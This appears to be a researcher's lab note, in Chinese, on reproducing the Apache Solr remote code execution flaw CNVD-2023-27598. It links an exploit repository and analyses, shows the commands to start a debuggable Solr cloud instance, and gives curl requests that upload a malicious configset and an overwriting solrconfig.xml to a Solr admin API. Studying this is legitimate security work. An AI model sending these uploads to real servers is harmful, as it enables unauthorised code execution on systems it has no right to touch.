# CNVD-2023-27598_ApacheSolr_RCE

- exp
  - `https://github.com/pupil857/Solr-Exploit`
- 分析
    - [原始-360](https://blog.noah.360.net/apache-solr-rce/)
    - `https://blog.huamang.xyz/post/solr_cloud_rce/`
    - `https://okaytc.github.io/posts/5a99c826.html`

---

## 利用

```bash
# -c开启solrcloud模式，-f后台显示执行情况，-a调试参数(端口设置同idea一样) (win上始终没能跑成功)(linux上用 solr 文件跑 9.1 成功了)
solr.cmd start -c -f -a "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:35005"
./solr start -e cloud -a "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"
```

```bash
curl -X POST --header "Content-Type:application/octet-stream" --data-binary @conf.zip "http://192.168.1.215:8983/solr/admin/configs?action=UPLOAD&name=lib9"

curl -X POST --header "Content-Type:application/octet-stream" --data-binary @solrconfig.xml "http://192.168.1.215:8983/solr/admin/configs?action=UPLOAD&name=lib9&filePath=solrconfig.xml&overwrite=true"

```

```
curl -X POST --header "Content-Type:application/octet-stream" --data-binary @conf.zip "http://192.168.1.215:8080/solr/admin/configs?action=UPLOAD&name=lib9"

curl -X POST --header "Content-Type:application/octet-stream" --data-binary @solrconfig.xml "http://192.168.1.215:8080/solr/admin/configs?action=UPLOAD&name=lib9&filePath=solrconfig.xml&overwrite=true"
```